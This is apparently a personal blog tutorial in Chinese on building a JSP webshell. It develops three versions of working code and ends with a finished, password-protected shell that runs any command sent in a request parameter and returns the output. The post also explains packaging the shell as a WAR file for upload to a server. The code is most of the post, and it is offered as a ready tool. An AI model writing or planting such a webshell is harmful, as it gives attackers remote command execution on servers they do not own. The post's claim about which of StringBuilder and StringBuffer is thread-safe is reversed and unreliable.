---
title: jsp小马实践
date: 2022-01-19 10:21:31
tags:
      - web
      - java
      - java木马
categoties: web
---

经过javaWeb的学习,现在开始尝试编写jsp小马

先从最简单的原理开始

```jsp

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%

try {
    String cmd = request.getParameter("cmd");
    out.print(Runtime.getRuntime().exec(cmd));
}catch (Exception e){
    e.printStackTrace();
}
%>

```

成功打开记事本

![image-20220119153656574](https://gitee.com/blue_satchel/images/raw/master/image-20220119153656574.png)

上面的代码存在诸多不足,比如只能显示单行输出等

接下来开始解决只能显示单行输出的命令的问题

Runtime.getRuntime().exec(c)返回的是一个Process对象类型的值

查看Process源代码,发现其返回的是一个iutputStream,正好可以用inputStream接收

![image-20220119154927926](https://gitee.com/blue_satchel/images/raw/master/image-20220119154927926.png)



解决办法是利用StringBuilder或者StringBuffer中的append方法和JAVA io流,利用inputStream获取字节流到BufferReader转换成字符流,再通过Append方法写入到要输出的字符串中

关于StringBuilder和StringBuffer,StringBuilder是线程安全的,编辑的时候会上锁,但是这里为了性能,选择线程不安全的StringBuffer更好

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedWriter" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String cmd = request.getParameter("cmd");

    StringBuffer res=new StringBuffer();
    try{
        Process p=Runtime.getRuntime().exec(cmd);
        InputStream inputStream=p.getInputStream();
        InputStreamReader inputStreamReader=new InputStreamReader(inputStream);
        BufferedReader bufferedReader=new BufferedReader(inputStreamReader);
        String len;
        while((len=bufferedReader.readLine())!=null){
            res.append(len+"\n");
        }
    }catch (Exception e){
        res.append(e.getMessage());
    }
    out.print(res.toString());
%>

```

改进后可以执行命令并抛出错误信息,但是windows下很多命令无法执行..........

![image-20220119160519025](https://gitee.com/blue_satchel/images/raw/master/image-20220119160519025.png)

参考了这篇龙龙姐推荐的文章https://www.cnblogs.com/mingforyou/p/3551199.html

明白了<label style="background:yellow">windows下面要把cmd中的命令当做参数去运行cmd</label>

比如`dir`,就写成`cmd /C dir`

![image-20220119163716240](https://gitee.com/blue_satchel/images/raw/master/image-20220119163716240.png)

接下来将代码做简单的修改和功能的封装,让其看起来简短美观

完成!!!!

##### 成品

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" import="java.io.*" %>
<%!public String execute(String cmd)
    {
        StringBuffer res = new StringBuffer();
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
            String len;
            while ((len = bufferedReader.readLine()) != null) {
                res.append(len + "\n");
            }
        } catch (Exception e) {
            res.append(e.getMessage());
        }
        return res.toString();
    }
%>
<%
    if("password".equals(request.getParameter("pwd"))&&request.getParameter("cmd")!=null){
        out.println("<pre>"+execute(request.getParameter("cmd"))+"</pre>");
    }else{
        out.print("<h2>你让我执行什么啊????</h2>");
    }
%>

```

windows下测试:

![image-20220119170718703](https://gitee.com/blue_satchel/images/raw/master/image-20220119170718703.png)

linux下测试:

首先通过jar命令打包jsp马为war

`jar cvf test.war .\horse.jsp .`

第一个参数为打包后的war包名称, 第二个参数为要打包的文件路径   第三个参数表示要输出的目录,用`.`表示输出到当前目录

上传war

打开对应路径

输入对应参数

![image-20220119185016439](https://gitee.com/blue_satchel/images/raw/master/image-20220119185016439.png)



